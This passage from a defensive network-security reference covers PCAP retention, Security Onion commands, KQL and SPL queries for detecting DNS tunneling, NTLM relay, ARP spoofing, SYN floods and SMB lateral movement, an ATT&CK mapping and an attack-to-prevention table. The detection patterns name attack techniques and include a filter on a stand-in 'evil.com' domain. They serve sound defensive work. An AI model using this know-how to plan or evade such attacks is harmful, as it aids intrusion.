# Selective capture: only capture when Suricata fires (via unified2 or EVE JSON)
# Barnyard2 + pcap-capture module

# Stenographer (Google) — full PCAP with indexed query
# Query: "port 445 and host 192.168.1.50 and after 1h ago"
stenoread 'port 445 and host 192.168.1.50 and after 1h ago' | \
  tcpdump -r - -w /tmp/smb_traffic.pcap

# Retention guidelines:
# Full PCAP: 24-72 hours (storage budget dependent)
# NetFlow: 90 days minimum (compliance), 1 year recommended
# Zeek logs: 30-90 days
# Alert/event data: 1-7 years (SIEM)
```

### Security Onion Deployment

Security Onion (securityonion.net) bundles Zeek, Suricata, Elasticsearch, Kibana, CyberChef, and TheHive.

```bash
# Sensor modes:
# - Standalone: all components on one box (labs/small nets)
# - Distributed: manager + sensor nodes (enterprise)
# - Import: analyze captured PCAP files

# Security Onion CLI
so-status              # check all services
so-rule-update         # update Suricata rules
so-zeek-restart        # restart Zeek
so-elasticsearch-status

# Hunt via web UI (Hunt / PCAP / Kibana)
# Common starting queries in Hunt:
# Event type: "alert" for IDS alerts
# Event type: "conn" for flow data
# Filter: event.module:"zeek" AND zeek.dns.query:*.evil.com
```

### KQL and SPL Detection Queries

**Kusto Query Language (Microsoft Sentinel / Defender):**

```kql
// DNS tunneling via long subdomain detection
DnsEvents
| where QueryType in ("TXT", "NULL", "A", "AAAA")
| extend subdomain = tostring(split(Name, ".")[0])
| where strlen(subdomain) > 40
| summarize count(), dcount(Name) by ClientIP, bin(TimeGenerated, 5m)
| where count_ > 10

// NTLM Relay - multiple type 3 logons from single source
SecurityEvent
| where EventID == 4624 and LogonType == 3
| where TimeGenerated > ago(1h)
| summarize target_count=dcount(Computer), targets=make_set(Computer), 
            events=count() by Account, IpAddress
| where target_count > 3 and events > 10
| project-rename source_ip=IpAddress, lateral_targets=target_count

// BGP session drop (requires router syslog forwarding)
Syslog
| where ProcessName == "bgpd" or SyslogMessage contains "BGP"
| where SyslogMessage contains "session" and SyslogMessage contains "down"
| project TimeGenerated, Computer, SyslogMessage
| extend peer = extract("neighbor ([0-9.]+)", 1, SyslogMessage)
| summarize drops=count() by peer, bin(TimeGenerated, 15m)
| where drops > 5   // flapping BGP session

// DDoS - inbound traffic spike
AzureNetworkAnalytics_CL
| where TimeGenerated > ago(1h)
| summarize bytes=sum(BytesSent_d) by DestinationPort_d, bin(TimeGenerated, 1m)
| where bytes > 1000000000   // 1 GB/min threshold
| sort by bytes desc
```

**Splunk Processing Language (SPL):**

```spl
| Detect ARP Spoofing via Zeek arp.log
index=zeek sourcetype=zeek_arp arp.opcode="reply"
| stats count by arp.src_mac arp.src_ip
| stats dc(arp.src_ip) as ip_count by arp.src_mac
| where ip_count > 1
| sort -ip_count

| DNS Tunneling detection — query entropy
index=zeek sourcetype=zeek_dns
| eval subdomain=mvindex(split(query,"."),0)
| eval sdlen=len(subdomain)
| where sdlen > 40
| stats count avg(sdlen) as avg_len dc(query) as unique_q by src_ip
| where count > 20 AND avg_len > 50

| SYN flood detection from NetFlow
index=netflow proto=TCP tcp_flags=S
| bin span=10s _time
| stats count by dest_ip _time
| where count > 5000
| eval alert="Possible SYN Flood to "+dest_ip

| Lateral movement via SMB
index=zeek sourcetype=zeek_conn dest_port=445
| where match(src_ip, "^10\.") AND match(dest_ip, "^10\.")
| stats dc(dest_ip) as lateral_targets by src_ip
| where lateral_targets > 5
| sort -lateral_targets
```

### MITRE ATT&CK Navigator Coverage Mapping

The following table maps this reference to ATT&CK techniques and recommended detections:

| ATT&CK ID | Technique | Section | Key Detection |
|---|---|---|---|
| T1595.001 | Scanning IP Blocks | §1, §10 | IDS scan signatures, flow rate |
| T1595.002 | Vulnerability Scanning | §1, §10 | Service probe signatures |
| T1018 | Remote System Discovery | §5, §10 | Internal nmap/masscan alerts |
| T1040 | Network Sniffing | §2, §4 | Promiscuous mode NIC detection |
| T1046 | Network Service Discovery | §5, §10 | SMB enum, port scan detection |
| T1557.001 | ARP Cache Poisoning | §2, §4 | DAI, arpwatch, NDR |
| T1557.002 | LLMNR/NBT-NS Poisoning | §5 | MDI alert, Event 4648 |
| T1498.001 | Direct Network Flood | §6 | Baseline + threshold |
| T1498.002 | Reflection Amplification | §6 | Flow analysis, scrubbing |
| T1499.002 | Service Exhaustion Flood | §6 | App-layer rate limiting |
| T1590 | Gather Victim Network Info | §1, §7 | BGP monitoring, passive DNS |
| T1565.002 | Transmitted Data Manipulation | §4, §7 | TLS enforcement, RPKI |
| T1048.003 | Exfiltration over DNS | §3 | Zeek dns.log entropy analysis |
| T1572 | Protocol Tunneling | §3, §9 | Payload size, frequency anomaly |
| T1071.004 | DNS as C2 | §3 | Fast flux, NXDOMAIN rate |
| T1584.005 | Botnet | §6 | Source IP reputation, flow |

---

## Quick Reference: Attack → Detection → Prevention

| Attack | Immediate Detection | Prevention |
|---|---|---|
| ARP Spoofing | DAI, arpwatch MAC flip alert | DAI, static ARP on critical hosts |
| DNS Poisoning | DNSSEC validation failure | DNSSEC, DNS over TLS |
| DNS Tunneling | Long FQDN, high entropy, query rate | RPZ, DoH blocking, egress filter |
| SSL Stripping | HTTP to HTTPS-expected host | HSTS preload, TLS-only policy |
| NTLM Relay | Event 4624/4648 patterns, MDI | SMB signing, disable LLMNR/NBNS |
| SYN Flood | SYN-RECV state count | SYN cookies, rate limiting |
| DNS Amplification | UDP 53 response > request | Close open resolvers, BCP38 |
| BGP Hijack | BGPmon prefix monitor | RPKI ROV, IRR filtering |
| WPA2 PMKID | WIDS probe pattern | WPA3, strong PSK |
| DHCP Starvation | DHCP snooping rate-limit hit | Port security, DHCP snooping |
| VLAN Hopping | Unexpected VLAN traffic | Disable DTP, change native VLAN |
| ICMP Tunneling | Large ICMP payload, high rate | ICMP payload size filter |
| Coercion (PetitPotam) | Machine account NTLM auth | Patch, disable EFS, EPA |
| Memcached Amplification | UDP 11211 to spoofed IPs | Bind to 127.0.0.1, disable UDP |

---

*This reference is maintained for defensive research and operational security purposes. All techniques described are documented to enable detection, prevention, and incident response — not for unauthorized use.*
